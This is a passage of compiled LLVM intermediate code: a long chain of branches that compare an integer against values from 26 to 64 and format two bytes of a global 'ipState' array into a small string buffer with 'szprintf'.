; <label>:276:                                    ; preds = %269, %266
  %277 = load i32, i32* %1, align 4
  %278 = icmp eq i32 %277, 26
  br i1 %278, label %279, label %286

; <label>:279:                                    ; preds = %276
  %280 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %282 = zext i8 %281 to i32
  %283 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %284 = zext i8 %283 to i32
  %285 = call i32 (i8*, i8*, ...) @szprintf(i8* %280, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %282, i32 %284)
  br label %286

; <label>:286:                                    ; preds = %279, %276
  %287 = load i32, i32* %1, align 4
  %288 = icmp eq i32 %287, 27
  br i1 %288, label %289, label %296

; <label>:289:                                    ; preds = %286
  %290 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %292 = zext i8 %291 to i32
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %294 = zext i8 %293 to i32
  %295 = call i32 (i8*, i8*, ...) @szprintf(i8* %290, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 %292, i32 %294)
  br label %296

; <label>:296:                                    ; preds = %289, %286
  %297 = load i32, i32* %1, align 4
  %298 = icmp eq i32 %297, 28
  br i1 %298, label %299, label %306

; <label>:299:                                    ; preds = %296
  %300 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %302 = zext i8 %301 to i32
  %303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %304 = zext i8 %303 to i32
  %305 = call i32 (i8*, i8*, ...) @szprintf(i8* %300, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i32 %302, i32 %304)
  br label %306

; <label>:306:                                    ; preds = %299, %296
  %307 = load i32, i32* %1, align 4
  %308 = icmp eq i32 %307, 29
  br i1 %308, label %309, label %316

; <label>:309:                                    ; preds = %306
  %310 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %311 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %312 = zext i8 %311 to i32
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %314 = zext i8 %313 to i32
  %315 = call i32 (i8*, i8*, ...) @szprintf(i8* %310, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0), i32 %312, i32 %314)
  br label %316

; <label>:316:                                    ; preds = %309, %306
  %317 = load i32, i32* %1, align 4
  %318 = icmp eq i32 %317, 30
  br i1 %318, label %319, label %326

; <label>:319:                                    ; preds = %316
  %320 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %322 = zext i8 %321 to i32
  %323 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %324 = zext i8 %323 to i32
  %325 = call i32 (i8*, i8*, ...) @szprintf(i8* %320, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i32 %322, i32 %324)
  br label %326

; <label>:326:                                    ; preds = %319, %316
  %327 = load i32, i32* %1, align 4
  %328 = icmp eq i32 %327, 31
  br i1 %328, label %329, label %336

; <label>:329:                                    ; preds = %326
  %330 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %331 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %332 = zext i8 %331 to i32
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %334 = zext i8 %333 to i32
  %335 = call i32 (i8*, i8*, ...) @szprintf(i8* %330, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.72, i32 0, i32 0), i32 %332, i32 %334)
  br label %336

; <label>:336:                                    ; preds = %329, %326
  %337 = load i32, i32* %1, align 4
  %338 = icmp eq i32 %337, 32
  br i1 %338, label %339, label %346

; <label>:339:                                    ; preds = %336
  %340 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %342 = zext i8 %341 to i32
  %343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %344 = zext i8 %343 to i32
  %345 = call i32 (i8*, i8*, ...) @szprintf(i8* %340, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.73, i32 0, i32 0), i32 %342, i32 %344)
  br label %346

; <label>:346:                                    ; preds = %339, %336
  %347 = load i32, i32* %1, align 4
  %348 = icmp eq i32 %347, 33
  br i1 %348, label %349, label %356

; <label>:349:                                    ; preds = %346
  %350 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %352 = zext i8 %351 to i32
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %354 = zext i8 %353 to i32
  %355 = call i32 (i8*, i8*, ...) @szprintf(i8* %350, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.74, i32 0, i32 0), i32 %352, i32 %354)
  br label %356

; <label>:356:                                    ; preds = %349, %346
  %357 = load i32, i32* %1, align 4
  %358 = icmp eq i32 %357, 34
  br i1 %358, label %359, label %366

; <label>:359:                                    ; preds = %356
  %360 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %362 = zext i8 %361 to i32
  %363 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %364 = zext i8 %363 to i32
  %365 = call i32 (i8*, i8*, ...) @szprintf(i8* %360, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i32 %362, i32 %364)
  br label %366

; <label>:366:                                    ; preds = %359, %356
  %367 = load i32, i32* %1, align 4
  %368 = icmp eq i32 %367, 34
  br i1 %368, label %369, label %376

; <label>:369:                                    ; preds = %366
  %370 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %371 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %372 = zext i8 %371 to i32
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %374 = zext i8 %373 to i32
  %375 = call i32 (i8*, i8*, ...) @szprintf(i8* %370, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.76, i32 0, i32 0), i32 %372, i32 %374)
  br label %376

; <label>:376:                                    ; preds = %369, %366
  %377 = load i32, i32* %1, align 4
  %378 = icmp eq i32 %377, 35
  br i1 %378, label %379, label %386

; <label>:379:                                    ; preds = %376
  %380 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %381 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %382 = zext i8 %381 to i32
  %383 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %384 = zext i8 %383 to i32
  %385 = call i32 (i8*, i8*, ...) @szprintf(i8* %380, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i32 %382, i32 %384)
  br label %386

; <label>:386:                                    ; preds = %379, %376
  %387 = load i32, i32* %1, align 4
  %388 = icmp eq i32 %387, 36
  br i1 %388, label %389, label %396

; <label>:389:                                    ; preds = %386
  %390 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %391 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %392 = zext i8 %391 to i32
  %393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %394 = zext i8 %393 to i32
  %395 = call i32 (i8*, i8*, ...) @szprintf(i8* %390, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.78, i32 0, i32 0), i32 %392, i32 %394)
  br label %396

; <label>:396:                                    ; preds = %389, %386
  %397 = load i32, i32* %1, align 4
  %398 = icmp eq i32 %397, 37
  br i1 %398, label %399, label %406

; <label>:399:                                    ; preds = %396
  %400 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %401 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %402 = zext i8 %401 to i32
  %403 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %404 = zext i8 %403 to i32
  %405 = call i32 (i8*, i8*, ...) @szprintf(i8* %400, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.79, i32 0, i32 0), i32 %402, i32 %404)
  br label %406

; <label>:406:                                    ; preds = %399, %396
  %407 = load i32, i32* %1, align 4
  %408 = icmp eq i32 %407, 38
  br i1 %408, label %409, label %416

; <label>:409:                                    ; preds = %406
  %410 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %411 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %412 = zext i8 %411 to i32
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %414 = zext i8 %413 to i32
  %415 = call i32 (i8*, i8*, ...) @szprintf(i8* %410, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0), i32 %412, i32 %414)
  br label %416

; <label>:416:                                    ; preds = %409, %406
  %417 = load i32, i32* %1, align 4
  %418 = icmp eq i32 %417, 39
  br i1 %418, label %419, label %426

; <label>:419:                                    ; preds = %416
  %420 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %421 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %422 = zext i8 %421 to i32
  %423 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %424 = zext i8 %423 to i32
  %425 = call i32 (i8*, i8*, ...) @szprintf(i8* %420, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.81, i32 0, i32 0), i32 %422, i32 %424)
  br label %426

; <label>:426:                                    ; preds = %419, %416
  %427 = load i32, i32* %1, align 4
  %428 = icmp eq i32 %427, 40
  br i1 %428, label %429, label %436

; <label>:429:                                    ; preds = %426
  %430 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %432 = zext i8 %431 to i32
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %434 = zext i8 %433 to i32
  %435 = call i32 (i8*, i8*, ...) @szprintf(i8* %430, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.82, i32 0, i32 0), i32 %432, i32 %434)
  br label %436

; <label>:436:                                    ; preds = %429, %426
  %437 = load i32, i32* %1, align 4
  %438 = icmp eq i32 %437, 41
  br i1 %438, label %439, label %446

; <label>:439:                                    ; preds = %436
  %440 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %441 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %442 = zext i8 %441 to i32
  %443 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %444 = zext i8 %443 to i32
  %445 = call i32 (i8*, i8*, ...) @szprintf(i8* %440, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.83, i32 0, i32 0), i32 %442, i32 %444)
  br label %446

; <label>:446:                                    ; preds = %439, %436
  %447 = load i32, i32* %1, align 4
  %448 = icmp eq i32 %447, 42
  br i1 %448, label %449, label %456

; <label>:449:                                    ; preds = %446
  %450 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %452 = zext i8 %451 to i32
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %454 = zext i8 %453 to i32
  %455 = call i32 (i8*, i8*, ...) @szprintf(i8* %450, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.84, i32 0, i32 0), i32 %452, i32 %454)
  br label %456

; <label>:456:                                    ; preds = %449, %446
  %457 = load i32, i32* %1, align 4
  %458 = icmp eq i32 %457, 43
  br i1 %458, label %459, label %466

; <label>:459:                                    ; preds = %456
  %460 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %462 = zext i8 %461 to i32
  %463 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %464 = zext i8 %463 to i32
  %465 = call i32 (i8*, i8*, ...) @szprintf(i8* %460, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i32 %462, i32 %464)
  br label %466

; <label>:466:                                    ; preds = %459, %456
  %467 = load i32, i32* %1, align 4
  %468 = icmp eq i32 %467, 44
  br i1 %468, label %469, label %476

; <label>:469:                                    ; preds = %466
  %470 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %471 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %472 = zext i8 %471 to i32
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %474 = zext i8 %473 to i32
  %475 = call i32 (i8*, i8*, ...) @szprintf(i8* %470, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.86, i32 0, i32 0), i32 %472, i32 %474)
  br label %476

; <label>:476:                                    ; preds = %469, %466
  %477 = load i32, i32* %1, align 4
  %478 = icmp eq i32 %477, 45
  br i1 %478, label %479, label %486

; <label>:479:                                    ; preds = %476
  %480 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %482 = zext i8 %481 to i32
  %483 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %484 = zext i8 %483 to i32
  %485 = call i32 (i8*, i8*, ...) @szprintf(i8* %480, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.87, i32 0, i32 0), i32 %482, i32 %484)
  br label %486

; <label>:486:                                    ; preds = %479, %476
  %487 = load i32, i32* %1, align 4
  %488 = icmp eq i32 %487, 46
  br i1 %488, label %489, label %496

; <label>:489:                                    ; preds = %486
  %490 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %491 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %492 = zext i8 %491 to i32
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %494 = zext i8 %493 to i32
  %495 = call i32 (i8*, i8*, ...) @szprintf(i8* %490, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.88, i32 0, i32 0), i32 %492, i32 %494)
  br label %496

; <label>:496:                                    ; preds = %489, %486
  %497 = load i32, i32* %1, align 4
  %498 = icmp eq i32 %497, 47
  br i1 %498, label %499, label %506

; <label>:499:                                    ; preds = %496
  %500 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %502 = zext i8 %501 to i32
  %503 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %504 = zext i8 %503 to i32
  %505 = call i32 (i8*, i8*, ...) @szprintf(i8* %500, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.89, i32 0, i32 0), i32 %502, i32 %504)
  br label %506

; <label>:506:                                    ; preds = %499, %496
  %507 = load i32, i32* %1, align 4
  %508 = icmp eq i32 %507, 48
  br i1 %508, label %509, label %516

; <label>:509:                                    ; preds = %506
  %510 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %511 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %512 = zext i8 %511 to i32
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %514 = zext i8 %513 to i32
  %515 = call i32 (i8*, i8*, ...) @szprintf(i8* %510, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.90, i32 0, i32 0), i32 %512, i32 %514)
  br label %516

; <label>:516:                                    ; preds = %509, %506
  %517 = load i32, i32* %1, align 4
  %518 = icmp eq i32 %517, 49
  br i1 %518, label %519, label %526

; <label>:519:                                    ; preds = %516
  %520 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %522 = zext i8 %521 to i32
  %523 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %524 = zext i8 %523 to i32
  %525 = call i32 (i8*, i8*, ...) @szprintf(i8* %520, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i32 %522, i32 %524)
  br label %526

; <label>:526:                                    ; preds = %519, %516
  %527 = load i32, i32* %1, align 4
  %528 = icmp eq i32 %527, 50
  br i1 %528, label %529, label %536

; <label>:529:                                    ; preds = %526
  %530 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %531 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %532 = zext i8 %531 to i32
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %534 = zext i8 %533 to i32
  %535 = call i32 (i8*, i8*, ...) @szprintf(i8* %530, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0), i32 %532, i32 %534)
  br label %536

; <label>:536:                                    ; preds = %529, %526
  %537 = load i32, i32* %1, align 4
  %538 = icmp eq i32 %537, 51
  br i1 %538, label %539, label %546

; <label>:539:                                    ; preds = %536
  %540 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %542 = zext i8 %541 to i32
  %543 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %544 = zext i8 %543 to i32
  %545 = call i32 (i8*, i8*, ...) @szprintf(i8* %540, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.93, i32 0, i32 0), i32 %542, i32 %544)
  br label %546

; <label>:546:                                    ; preds = %539, %536
  %547 = load i32, i32* %1, align 4
  %548 = icmp eq i32 %547, 52
  br i1 %548, label %549, label %556

; <label>:549:                                    ; preds = %546
  %550 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %551 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %552 = zext i8 %551 to i32
  %553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %554 = zext i8 %553 to i32
  %555 = call i32 (i8*, i8*, ...) @szprintf(i8* %550, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.94, i32 0, i32 0), i32 %552, i32 %554)
  br label %556

; <label>:556:                                    ; preds = %549, %546
  %557 = load i32, i32* %1, align 4
  %558 = icmp eq i32 %557, 53
  br i1 %558, label %559, label %566

; <label>:559:                                    ; preds = %556
  %560 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %562 = zext i8 %561 to i32
  %563 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %564 = zext i8 %563 to i32
  %565 = call i32 (i8*, i8*, ...) @szprintf(i8* %560, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.95, i32 0, i32 0), i32 %562, i32 %564)
  br label %566

; <label>:566:                                    ; preds = %559, %556
  %567 = load i32, i32* %1, align 4
  %568 = icmp eq i32 %567, 54
  br i1 %568, label %569, label %576

; <label>:569:                                    ; preds = %566
  %570 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %571 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %572 = zext i8 %571 to i32
  %573 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %574 = zext i8 %573 to i32
  %575 = call i32 (i8*, i8*, ...) @szprintf(i8* %570, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.96, i32 0, i32 0), i32 %572, i32 %574)
  br label %576

; <label>:576:                                    ; preds = %569, %566
  %577 = load i32, i32* %1, align 4
  %578 = icmp eq i32 %577, 55
  br i1 %578, label %579, label %586

; <label>:579:                                    ; preds = %576
  %580 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %581 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %582 = zext i8 %581 to i32
  %583 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %584 = zext i8 %583 to i32
  %585 = call i32 (i8*, i8*, ...) @szprintf(i8* %580, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.97, i32 0, i32 0), i32 %582, i32 %584)
  br label %586

; <label>:586:                                    ; preds = %579, %576
  %587 = load i32, i32* %1, align 4
  %588 = icmp eq i32 %587, 56
  br i1 %588, label %589, label %596

; <label>:589:                                    ; preds = %586
  %590 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %591 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %592 = zext i8 %591 to i32
  %593 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %594 = zext i8 %593 to i32
  %595 = call i32 (i8*, i8*, ...) @szprintf(i8* %590, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.98, i32 0, i32 0), i32 %592, i32 %594)
  br label %596

; <label>:596:                                    ; preds = %589, %586
  %597 = load i32, i32* %1, align 4
  %598 = icmp eq i32 %597, 57
  br i1 %598, label %599, label %606

; <label>:599:                                    ; preds = %596
  %600 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %601 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %602 = zext i8 %601 to i32
  %603 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %604 = zext i8 %603 to i32
  %605 = call i32 (i8*, i8*, ...) @szprintf(i8* %600, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.99, i32 0, i32 0), i32 %602, i32 %604)
  br label %606

; <label>:606:                                    ; preds = %599, %596
  %607 = load i32, i32* %1, align 4
  %608 = icmp eq i32 %607, 58
  br i1 %608, label %609, label %616

; <label>:609:                                    ; preds = %606
  %610 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %611 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %612 = zext i8 %611 to i32
  %613 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %614 = zext i8 %613 to i32
  %615 = call i32 (i8*, i8*, ...) @szprintf(i8* %610, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.100, i32 0, i32 0), i32 %612, i32 %614)
  br label %616

; <label>:616:                                    ; preds = %609, %606
  %617 = load i32, i32* %1, align 4
  %618 = icmp eq i32 %617, 59
  br i1 %618, label %619, label %626

; <label>:619:                                    ; preds = %616
  %620 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %621 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %622 = zext i8 %621 to i32
  %623 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %624 = zext i8 %623 to i32
  %625 = call i32 (i8*, i8*, ...) @szprintf(i8* %620, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.101, i32 0, i32 0), i32 %622, i32 %624)
  br label %626

; <label>:626:                                    ; preds = %619, %616
  %627 = load i32, i32* %1, align 4
  %628 = icmp eq i32 %627, 60
  br i1 %628, label %629, label %636

; <label>:629:                                    ; preds = %626
  %630 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %631 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %632 = zext i8 %631 to i32
  %633 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %634 = zext i8 %633 to i32
  %635 = call i32 (i8*, i8*, ...) @szprintf(i8* %630, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.102, i32 0, i32 0), i32 %632, i32 %634)
  br label %636

; <label>:636:                                    ; preds = %629, %626
  %637 = load i32, i32* %1, align 4
  %638 = icmp eq i32 %637, 61
  br i1 %638, label %639, label %646

; <label>:639:                                    ; preds = %636
  %640 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %641 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %642 = zext i8 %641 to i32
  %643 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %644 = zext i8 %643 to i32
  %645 = call i32 (i8*, i8*, ...) @szprintf(i8* %640, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.103, i32 0, i32 0), i32 %642, i32 %644)
  br label %646

; <label>:646:                                    ; preds = %639, %636
  %647 = load i32, i32* %1, align 4
  %648 = icmp eq i32 %647, 62
  br i1 %648, label %649, label %656

; <label>:649:                                    ; preds = %646
  %650 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %651 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %652 = zext i8 %651 to i32
  %653 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %654 = zext i8 %653 to i32
  %655 = call i32 (i8*, i8*, ...) @szprintf(i8* %650, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.104, i32 0, i32 0), i32 %652, i32 %654)
  br label %656

; <label>:656:                                    ; preds = %649, %646
  %657 = load i32, i32* %1, align 4
  %658 = icmp eq i32 %657, 63
  br i1 %658, label %659, label %666

; <label>:659:                                    ; preds = %656
  %660 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %661 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %662 = zext i8 %661 to i32
  %663 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %664 = zext i8 %663 to i32
  %665 = call i32 (i8*, i8*, ...) @szprintf(i8* %660, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.105, i32 0, i32 0), i32 %662, i32 %664)
  br label %666

; <label>:666:                                    ; preds = %659, %656
  %667 = load i32, i32* %1, align 4
  %668 = icmp eq i32 %667, 64
  br i1 %668, label %669, label %676

; <label>:669:                                    ; preds = %666
  %670 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %671 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %672 = zext i8 %671 to i32
  %673 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %674 = zext i8 %673 to i32
